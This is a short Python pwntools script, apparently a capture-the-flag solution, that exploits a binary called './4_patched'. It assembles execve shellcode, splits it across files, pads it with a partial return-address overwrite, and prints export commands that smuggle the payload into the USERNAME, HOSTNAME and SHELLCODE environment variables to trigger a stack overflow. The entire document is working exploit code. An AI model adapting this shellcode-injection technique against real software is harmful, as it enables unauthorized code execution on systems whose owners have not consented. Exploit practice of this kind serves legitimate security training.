#!/usr/bin/env python3

import os
from pwn import *

exe = ELF("./4_patched")

context.binary = exe
context.arch = 'amd64'
shellcode = shellcraft.execve("/usr/local/bin/l33t", ["/usr/local/bin/l33t"], 0)
print(shellcode)
shellcode = asm(shellcode)


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="")
    else:
        r = remote("addr", 1337)

    return r


def main():
    print(len(shellcode))
    print(shellcode)
    # to jump = 0x7fffffffe068
    # to jump = 0x7fffffffe103
            #   0x7fffffffe6fe
    print(shellcode.hex())
    b = b"\xa1\xa3"
    data = shellcode[40:] + b"A"*32 + b
    with open("shellcode", "wb") as f:
        f.write(data)
    with open("Username", "wb") as f:
        f.write(shellcode[:40])
    with open("shellcode_full", "wb") as f:
        f.write(shellcode + b"\xbb"*40)
    print('export USERNAME="$(cat Username)"')
    print('export HOSTNAME="$(cat shellcode)"')
    print('export SHELLCODE="$(cat shellcode_full)"')



if __name__ == "__main__":
    main()
